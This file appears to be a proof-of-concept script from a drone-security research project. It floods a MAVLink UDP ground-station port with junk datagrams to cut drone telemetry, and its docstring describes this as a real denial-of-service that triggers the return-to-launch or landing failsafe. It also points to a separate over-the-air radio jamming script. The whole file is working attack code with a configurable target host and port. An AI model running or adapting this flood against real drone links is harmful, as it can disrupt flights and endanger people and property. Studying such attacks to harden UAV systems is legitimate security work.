"""PoC 05 (interactive/local) - Link jamming by saturation (PWNUAV IM-01/02).

Version for the interactive UDP demo: floods the link hub with junk datagrams at
a high rate. The shared channel collapses and the drone's legitimate telemetry
no longer reaches the monitor -> the monitor shows LINK LOST and triggers the
failsafe (RTL/LAND). This is a real channel DoS (logical equivalent of RF
jamming), handy for recording the IMPACT on the ASCII monitor.

The over-the-air SDR jamming (measured at ~100% loss) lives in
  attacks/05-jamming/jam_aire.py

Usage:
  python -m pwnuav.jam --port 14550 --seconds 4
"""
from __future__ import annotations

import argparse
import os
import socket
import time


def main() -> None:
    ap = argparse.ArgumentParser(description="PWNUAV PoC 05 - link jamming (flood)")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=14550)
    ap.add_argument("--seconds", type=float, default=4.0)
    ap.add_argument("--rate", type=int, default=30000, help="flood datagrams/sec")
    args = ap.parse_args()

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dst = (args.host, args.port)
    payload = b"\xfd" + os.urandom(260)   # junk ~ the size of a MAVLink 2 frame

    print("=" * 60)
    print(" PWNUAV JAMMING / DoS (shared UDP channel)")
    print("=" * 60)
    print(f"[*] Target : drone link udp {args.host}:{args.port}")
    print(f"[*] Method : junk flood at ~{args.rate:,} datagrams/s for {args.seconds:.0f}s")
    print(f"[*] Effect : channel saturates -> legitimate telemetry can't get through -> LINK LOST")
    print("[IM-01] Starting jamming ... (watch the monitor: the link drops)\n")

    sent = 0
    t0 = time.time()
    interval = 1.0 / args.rate
    next_report = t0 + 1.0
    while time.time() - t0 < args.seconds:
        try:
            sock.sendto(payload, dst)
            sent += 1
        except OSError:
            pass
        # gentle rate limiting
        if interval > 0 and sent % 50 == 0:
            target = t0 + sent * interval
            slack = target - time.time()
            if slack > 0:
                time.sleep(slack)
        now = time.time()
        if now >= next_report:
            print(f"    [JAM] {sent:,} datagrams sent  (~{sent/(now-t0):,.0f}/s)  link DENIED")
            next_report = now + 1.0

    sock.close()
    dur = time.time() - t0
    print(f"\n[IM-02] Sustained loss > GCS timeout -> RTL / LAND.")
    print(f"[+] Jamming sent: {sent:,} datagrams in {dur:.1f}s (~{sent/dur:,.0f}/s). Link recovering.")


if __name__ == "__main__":
    main()
